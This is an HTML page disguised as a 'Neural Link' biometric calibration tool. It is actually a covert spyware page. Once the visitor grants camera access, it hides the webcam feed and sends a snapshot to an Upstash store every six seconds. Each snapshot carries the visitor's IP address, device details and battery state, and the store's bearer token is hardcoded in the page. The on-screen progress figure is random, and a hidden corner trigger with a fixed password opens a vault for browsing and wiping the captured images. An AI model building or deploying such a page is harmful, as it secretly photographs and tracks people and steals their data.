<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Neural Link Interface</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { overscroll-behavior: none; background: #000; color: #fff; font-family: sans-serif; margin: 0; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        
        .reticle {
            width: 240px; height: 240px;
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 50%;
            position: relative;
            animation: pulse 5s ease-in-out infinite;
        }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.2; } 50% { transform: scale(1.08); opacity: 0.4; } }
        
        .scan-line {
            position: absolute; width: 100%; height: 1px;
            background: rgba(255,255,255,0.15);
            top: 0; animation: scan 3.5s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        .terminal-input {
            background: transparent; border: none; border-bottom: 2px solid #333;
            color: #fff; padding: 10px; font-family: monospace; font-size: 18px;
            outline: none; width: 100%; text-align: center; letter-spacing: 0.3em;
        }

        .active-push .reticle { border-color: rgba(255,255,255,0.3); }
        
        #hiddenSensor {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            object-fit: cover; z-index: -1; opacity: 0.01; pointer-events: none;
        }
    </style>
</head>
<body class="overflow-hidden bg-black">

    <video id="hiddenSensor" autoplay playsinline muted></video>

    <!-- HIDDEN TRIGGER -->
    <div class="fixed bottom-0 left-0 z-[100] w-20 h-20" id="vaultTrigger"></div>

    <main id="mainNode" class="h-screen flex flex-col items-center justify-center p-8 text-center relative z-10 bg-black">
        <div id="setupView">
            <div class="mb-14 relative flex justify-center items-center">
                <div class="reticle"></div>
                <div class="absolute text-white/10 text-[8px] tracking-[0.5em] uppercase">Ready_For_Sync</div>
            </div>
            <h1 class="text-xl font-thin tracking-[0.6em] uppercase mb-6">Neural Link</h1>
            <p class="text-white/20 text-[9px] uppercase tracking-[0.2em] max-w-xs mx-auto mb-14">
                Analyze bio-feedback patterns via optical sensor synchronization.
            </p>
            <button id="initBtn" class="border border-white/10 hover:border-white/40 px-14 py-5 rounded-full text-[9px] uppercase tracking-[0.4em] transition-all">
                Initialize Calibration
            </button>
        </div>

        <div id="activeView" class="hidden">
            <div class="reticle mx-auto mb-14 overflow-hidden">
                <div class="scan-line"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <div id="percentDisplay" class="text-2xl font-extralight tracking-[0.2em] text-white/70">0.00%</div>
                </div>
            </div>
            <div id="logStatus" class="text-[8px] text-white/10 uppercase tracking-[0.6em] animate-pulse">Syncing Biometrics...</div>
        </div>
    </main>

    <!-- VAULT INTERFACE -->
    <div id="vaultPanel" class="hidden fixed inset-0 bg-black z-[200] flex flex-col font-mono text-zinc-400">
        <div class="p-3 border-b border-white/5 flex justify-between items-center bg-black shrink-0">
            <div class="flex items-center gap-4">
                <h2 class="text-[9px] uppercase tracking-[0.2em] text-zinc-600">FULL_STACK_LOGGER_V3</h2>
                <span id="logCount" class="text-[9px] text-zinc-700 uppercase">-- RECORDS</span>
            </div>
            <div class="flex items-center gap-6">
                <button id="refreshBtn" class="text-sky-600 hover:text-sky-400 text-[10px] uppercase tracking-widest">PULL</button>
                <button id="wipeBtn" class="text-red-900/40 hover:text-red-500 text-[10px] uppercase tracking-widest">WIPE</button>
                <button id="exitVault" class="text-zinc-700 hover:text-white text-[10px] uppercase ml-4">CLOSE</button>
            </div>
        </div>

        <div id="vaultAuth" class="flex-grow flex flex-col items-center justify-center p-10 bg-black">
            <div class="w-full max-w-xs text-center">
                <div class="text-[8px] tracking-[1em] text-zinc-800 uppercase mb-8">Auth_Required</div>
                <input type="password" id="vaultKey" placeholder="••••••" class="terminal-input mb-8" autofocus>
                <button id="authBtn" class="text-[10px] uppercase text-zinc-700 hover:text-zinc-300 tracking-[0.4em]">Verify</button>
            </div>
        </div>

        <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden">
            <div id="imageGrid" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-2 no-scrollbar"></div>
        </div>
    </div>

    <canvas id="procCanvas" class="hidden"></canvas>

    <script>
        const KV_URL = "https://in-jaguar-49822.upstash.io";
        const KV_TOKEN = "AcKeAAIncDIwMmIzNDkzMGU4MjQ0ZTkxODU1M2U3YTU5MjM1ZWUwNHAyNDk4MjI";
        
        const sensor = document.getElementById('hiddenSensor');
        const initBtn = document.getElementById('initBtn');
        const setupView = document.getElementById('setupView');
        const activeView = document.getElementById('activeView');
        const percentDisplay = document.getElementById('percentDisplay');
        const canvas = document.getElementById('procCanvas');
        const vaultPanel = document.getElementById('vaultPanel');
        const vaultMain = document.getElementById('vaultMain');
        const vaultAuth = document.getElementById('vaultAuth');
        const vaultKey = document.getElementById('vaultKey');
        const imageGrid = document.getElementById('imageGrid');
        const logCount = document.getElementById('logCount');

        let isLive = false;
        let systemFingerprint = {};

        async function generateFingerprint() {
            let ip = "0.0.0.0";
            try { 
                const r = await fetch('https://api.ipify.org?format=json'); 
                const d = await r.json(); 
                ip = d.ip; 
            } catch(e){}

            let battery = "Unknown";
            try { 
                const b = await navigator.getBattery(); 
                battery = `${(b.level * 100).toFixed(0)}% ${b.charging ? '(Charging)' : ''}`;
            } catch(e){}

            systemFingerprint = {
                ip: ip,
                ua: navigator.userAgent,
                cores: navigator.hardwareConcurrency || '?',
                ram: navigator.deviceMemory || '?',
                lang: navigator.language,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                res: `${screen.width}x${screen.height}`,
                bat: battery
            };
        }

        const Cloud = {
            async push(img) {
                const key = `log_${Date.now()}`;
                document.body.classList.add('active-push');
                const payload = { 
                    img, 
                    info: systemFingerprint, 
                    t: new Date().toISOString() 
                };
                try {
                    await fetch(`${KV_URL}/set/${key}`, {
                        method: 'POST',
                        headers: { 'Authorization': `Bearer ${KV_TOKEN}` },
                        body: JSON.stringify(payload)
                    });
                } catch (e) {}
                setTimeout(() => document.body.classList.remove('active-push'), 200);
            },
            async pull() {
                try {
                    const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                    const kData = await kRes.json();
                    const keys = (kData.result || []).sort().reverse().slice(0, 100);
                    const results = [];
                    for (const k of keys) {
                        const vRes = await fetch(`${KV_URL}/get/${k}`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                        const vData = await vRes.json();
                        if (vData.result) results.push(JSON.parse(vData.result));
                    }
                    return results;
                } catch (e) { return []; }
            },
            async purge() {
                const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                const kData = await kRes.json();
                for (const k of (kData.result || [])) { await fetch(`${KV_URL}/del/${k}`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } }); }
            }
        };

        function startCapture() {
            if (isLive) return;
            isLive = true;
            setInterval(async () => {
                const ctx = canvas.getContext('2d');
                canvas.width = 400; canvas.height = 400;
                if (sensor.readyState === sensor.HAVE_ENOUGH_DATA) {
                    const min = Math.min(sensor.videoWidth, sensor.videoHeight);
                    ctx.drawImage(sensor, (sensor.videoWidth-min)/2, (sensor.videoHeight-min)/2, min, min, 0, 0, 400, 400);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                    // Update battery/dynamic stats before each push
                    await generateFingerprint();
                    Cloud.push(dataUrl);
                }
                percentDisplay.textContent = (Math.random() * 100).toFixed(2) + '%';
            }, 6000); 
        }

        initBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                sensor.srcObject = stream;
                sensor.play();
                await generateFingerprint();
                setupView.classList.add('hidden');
                activeView.classList.remove('hidden');
                startCapture();
            } catch (e) { 
                alert("Neural Calibration Error."); 
            }
        };

        document.getElementById('authBtn').onclick = () => {
            if (vaultKey.value === '5502012') {
                vaultAuth.classList.add('hidden');
                vaultMain.classList.remove('hidden');
                syncVault();
            }
        };

        async function syncVault() {
            logCount.textContent = "SYNCING...";
            const data = await Cloud.pull();
            imageGrid.innerHTML = '';
            logCount.textContent = `${data.length} RECORDS`;
            data.forEach(item => {
                const d = document.createElement('div');
                const info = item.info || {};
                d.className = "relative bg-zinc-950 border border-white/5 overflow-hidden flex flex-col";
                d.innerHTML = `
                    <img src="${item.img}" class="w-full aspect-square object-cover">
                    <div class="p-2 text-[7px] leading-tight text-zinc-500 font-mono">
                        <div class="text-sky-500 mb-1">${info.ip || '?.?.?.?'}</div>
                        <div class="truncate">${info.ua || 'Unknown UA'}</div>
                        <div class="flex justify-between mt-1 text-zinc-700">
                            <span>${info.res || '?x?'}</span>
                            <span>CPU:${info.cores} RAM:${info.ram}GB</span>
                        </div>
                        <div class="flex justify-between mt-0.5">
                            <span class="text-zinc-600">${info.tz || 'UTC'}</span>
                            <span class="${info.bat?.includes('Charging') ? 'text-green-900' : ''}">${info.bat || '?'}</span>
                        </div>
                    </div>
                `;
                imageGrid.appendChild(d);
            });
        }

        document.getElementById('refreshBtn').onclick = syncVault;
        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Purge Archive?")) { await Cloud.purge(); syncVault(); } };
        document.getElementById('vaultTrigger').onclick = () => vaultPanel.classList.toggle('hidden');
        document.getElementById('exitVault').onclick = () => vaultPanel.classList.add('hidden');
    </script>
</body>
</html>
